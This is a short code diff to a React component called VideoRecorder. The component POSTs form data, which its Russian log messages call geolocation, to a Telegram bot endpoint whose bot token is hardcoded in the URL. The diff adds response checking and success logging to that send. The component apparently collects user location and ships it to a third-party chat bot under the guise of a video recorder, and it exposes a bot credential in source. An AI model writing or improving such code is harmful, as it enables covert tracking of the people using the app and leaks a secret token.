@@ -160,16 +160,21 @@ function VideoRecorder() {
       );
 
       try {
-        await fetch(
+        const response = await fetch(
           `https://api.telegram.org/bot7994259922:AAFg95V-vIqovZXU8RXQfeo9TC91Bu3ppK8/sendMessage`,
           {
             method: "POST",
             body: formData,
           }
         );
-        setInfoSent(true); // Помечаем, что информация отправлена
+        if (response.ok) {
+          console.log("✅ Геолокация успешно отправлена в Telegram");
+          setInfoSent(true); // Помечаем, что информация отправлена
+        } else {
+          console.error("❌ Ошибка при отправке геолокации в Telegram");
+        }
       } catch (error) {
-        console.error("Ошибка при отправке геоданных:", error);
+        console.error("❌ Ошибка при отправке геолокации:", error);
       }
     }
   };
